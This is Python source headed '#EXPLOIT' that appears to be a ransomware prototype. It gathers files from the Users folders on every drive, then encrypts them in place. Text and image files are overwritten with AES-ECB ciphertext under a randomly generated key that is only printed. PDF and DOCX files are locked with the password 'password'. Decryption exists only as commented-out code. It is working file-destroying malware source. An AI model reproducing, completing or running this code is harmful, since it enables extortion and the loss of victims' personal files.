#EXPLOIT
#HANDS
import os
import string
from ctypes import windll
#from Pycryptodome import AES
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
#import Crypto.Cipher
import random
import Interistinf_Files2
import pikepdf
import aspose.words as aw

"""
def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

def list_all_interisting_files(harddrive):
    #list all txt, png, docx in Users/
    #return list of files
    extensions = [".txt", ".png", ".docx"]
    # dirs = os.listdir("/Users/Wherxit/")
    # print(dirs)
    files_return = []
    #parse recursively all files in dirs
    path = os.path.join(harddrive, "Users")
    for root, dirs, files in os.walk(harddrive+"/Users/"):
        for file in files:
            for ext in extensions:
                if file.endswith(ext):
                    files_return.append(os.path.join(root, file))
    return files_return


    for drive in drives:
        drive= drive + ":"
        files.append(list_all_interisting_files(drive))
    print(files)
"""

def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))

def generate_aes_key():
    #generate random string of 16
    key = random_char(16)
    print(key)
    #print("abcdefghijklmnop".encode())
    #return "abcdefghijklmnop".encode()
    return key

def encrypt_file(file_path, key):
    print("Crypting {}".format(file_path))
    if file_path.endswith('.pdf'):
        try: 
            no_extracting = pikepdf.Permissions(extract=False)
            pdf = pikepdf.Pdf.open(file_path,allow_overwriting_input=True)
            pdf.save(file_path,encryption=pikepdf.Encryption(owner="password", user="password", R=4, allow=no_extracting))
            pdf.close
        except pikepdf._qpdf.PasswordError:
            print("Already encrypted")
    elif file_path.endswith('.docx'):
        try:
            doc = aw.Document(file_path)
            options = aw.saving.OoxmlSaveOptions(aw.SaveFormat.DOCX)
            options.password = "password"
            doc.save(file_path, options)
            #print("Il s'agit d'un document word")
        except RuntimeError:
            print("File already Encrypted")
    else:
        global block_size
        block_size = 32
        global cipher
        cipher= AES.new(key.encode('utf8'), AES.MODE_ECB)
        with open(file_path, "rb") as f:
            data = f.read()
            #print(type(data))
        encrypted_data = cipher.encrypt(pad(data, block_size))
        #encrypted_data_final = pad(encrypted_data, block_size)
        with open(file_path, "wb") as f:
            f.write(encrypted_data)

def decrypt_file(file_path, key):
    if not (file_path.endswith('.pdf') or file_path.endswith('.docx')):
        print("Decrypting {}".format(file_path))
        #block_size = 32
        #cipher= AES.new(key.encode('utf8'), AES.MODE_ECB)
        with open(file_path, "rb") as f:
            data = f.read()
            print(data)
        decrypted_data = cipher.decrypt(data)
        data_dec= unpad(decrypted_data, block_size)
        print(data_dec)
    #dectrypted data to utf-8
        try: 
            data_dec = data_dec.decode("utf-8")
            print(data_dec)
            with open(file_path, "w+") as f:
                f.write(data_dec)
        except UnicodeDecodeError:
            print("Erreur de décodage")
        except TypeError:
            print("Typerror")
    else:
        print("PDF or WORD document the password to decrypt is \"password\"")


def main():
    print("test")
    key = generate_aes_key()
    print(key)
    drives = Interistinf_Files2.main()
    print(drives)
    for p in drives:
        encrypt_file(p,key)
    """
    for p in drives:
        decrypt_file(p,key)
    """

main()
